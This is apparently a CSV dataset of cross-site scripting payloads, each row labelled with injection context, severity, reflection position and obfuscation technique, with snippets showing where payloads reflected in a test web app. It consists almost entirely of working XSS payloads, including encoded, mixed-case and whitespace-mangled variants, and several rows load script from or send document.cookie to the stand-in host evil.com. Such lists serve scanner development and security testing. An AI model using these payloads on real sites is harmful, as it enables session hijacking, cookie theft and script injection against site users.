payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"""><img src=x onerror=alert(document.cookie));>","""><img src=x onerror=alert(document.cookie));> [position:html_body snippet_context:...iv class=""post-meta""><span class=""post-author"">testuser</span></div> <div>""><img src=x onerror=al]",tag_injection,high,,,html_body,mutated
\x3csvg onload=alert(1)\x3e,\x3csvg onload=alert(1)\x3e [position:html_body],event_handler,medium,,,html_body,obfuscated:hex_escape
"location
=""javascript:alert(	1)""","location
=""javascript:alert(	1)"" [position:none]",dom_sink,low,,,none,obfuscated:tab_newline_inject
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,low,,,html_body,mutated
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><svg onload=""conf]",tag_injection,medium,,,attribute,none
"<img/src
=x onerror
=alert(	1)//>","<img/src
=x onerror
=alert(	1)//> [position:script]",tag_injection,medium,,,script,obfuscated:tab_newline_inject
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid onerror=""alert('A]",tag_injection,medium,,,attribute,none
"onload=""confirm(1)""","onload=""confirm(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
onload='alert(1)',onload='alert(1)' [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid onload='alert(1)'],tag_injection,medium,,,attribute,none
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,high,,,attribute,original
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:html_body],tag_injection,medium,,,html_body,none
.alert(1);,".alert(1); [position:attribute snippet_context:...gap:.5rem""> <input name=""q"" value=""[Reflected in X-Search-Query header] .alert(1);"" placeholder=""]",tag_injection,medium,,,attribute,none
prompt(9),"prompt(9) [position:attribute snippet_context:...""theme-display"" style=""margin-top:1rem""></div> <form><input name=""theme"" value=""prompt(9)"" style=]",tag_injection,medium,,,attribute,none
"""><svg
 onload=alert()>","""><svg
 onload=alert()> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""""><svg onload=alert()>""> ]",tag_injection,medium,,,attribute,mutated
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],script_injection,low,,,html_body,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,original
alert(2),"alert(2) [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('alert(2)')""</code]",tag_injection,medium,,,attribute,none
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],script_injection,low,,,script,mutated
onerror=alert(0);>,onerror=alert(0);> [position:html_body],tag_injection,medium,,,html_body,none
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid //--></SCRIPT><SC]",tag_injection,high,,,attribute,encoding|case_variation
j\u0061v\u0061script:\u0061\u006cert(1),j\u0061v\u0061script:\u0061\u006cert(1) [position:style],attribute_escape,medium,,,style,obfuscated:unicode_escape
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:attribute],template_injection,high,,,attribute,mutated
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid //"";alert(String.]",tag_injection,high,,,attribute,encoding
onerror=alert(0);>,onerror=alert(0);> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid onerror=alert(0);],tag_injection,medium,,,attribute,none
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""""><img src=x oner]",tag_injection,high,,,attribute,encoding
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>","<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT> [position:script]",script_injection,medium,,,script,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,medium,,,html_body,original
<svg onload=alert()>,<svg onload=alert()> [position:comment],attribute_escape,medium,,,comment,none
<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT> [position:script],script_injection,low,,,script,obfuscated:mixed_case
<%= confirm(1) %>,<%= confirm(1) %> [position:html_body],event_handler,low,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,high,,,attribute,mutated
"<object data=""javascr/**/ipt:alert(1)"">","<object data=""javascr/**/ipt:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:comment_inject
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",js_uri,medium,,,attribute,mutated
<%= alert(1) %>,<%= alert(1) %> [position:html_body],attribute_escape,low,,,html_body,mutated
<svg////////onload=alert(1)>,"<svg////////onload=alert(1)> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<svg////////onload=alert(1)>"">]",tag_injection,medium,,,attribute,none
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",dom_sink,high,,,script,original
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<img src/onerror=alert(1)>""> <]",tag_injection,medium,,,attribute,none
prompt(9),prompt(9) [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid prompt(9);padding],tag_injection,medium,,,attribute,none
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,low,,,html_body,mutated
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div>""><svg onload=alert()><]",tag_injection,medium,,,html_body,none
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],tag_injection,medium,,,script,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,medium,,,script,original
onload='alert(1)',"onload='alert(1)' [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">onload='alert(1)']",tag_injection,medium,,,html_body,none
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:attribute]",attribute_escape,high,,,attribute,mutated
%3Cimg src=x onerror=alert(1)%3E,%3Cimg src=x onerror=alert(1)%3E [position:script],tag_injection,medium,,,script,obfuscated:url_encode
"\"" onerror=\u0061\u006cert(1)//","\"" onerror=\u0061\u006cert(1)// [position:attribute]",attribute_escape,high,,,attribute,obfuscated:unicode_escape
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>//--></SCRIPT><SC]",attribute_escape,high,,,attribute,encoding|case_variation
"location=""javaSCRIPT:alert(1)""","location=""javaSCRIPT:alert(1)"" [position:script]",tag_injection,medium,,,script,mutated
‘; alert(1);,"‘; alert(1); [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""‘; alert(1);"">Next >></a> ]",tag_injection,medium,,,attribute,none
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><img src=asdf one]",tag_injection,high,,,attribute,none
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:html_body snippet_context:<img src/onerror=prompt(8)>({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"<embed src=""javascript:confirm(1)"">","<embed src=""javascript:confirm(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
"<svG/x="">""/onfocus=confirm()//","<svG/x="">""/onfocus=confirm()// [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<svG/x="">""/onfocus=confir]",attribute_escape,medium,,,attribute,mutated
<select ^__^>alert(String.fromCharCode(49))</script ^__^,"<select ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<select ^__^>aler]",tag_injection,high,,,attribute,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,low,,,style,original
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""//--></SCRIPT><SC]",tag_injection,high,,,attribute,encoding|case_variation
confirm(1))</SCRIPT>,confirm(1))</SCRIPT> [position:html_body],tag_injection,high,,,html_body,mutated
<script ^__^>alert(String.fromCharCode(49))</script ^__^,<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<script ^__^>aler],script_injection,high,,,attribute,encoding
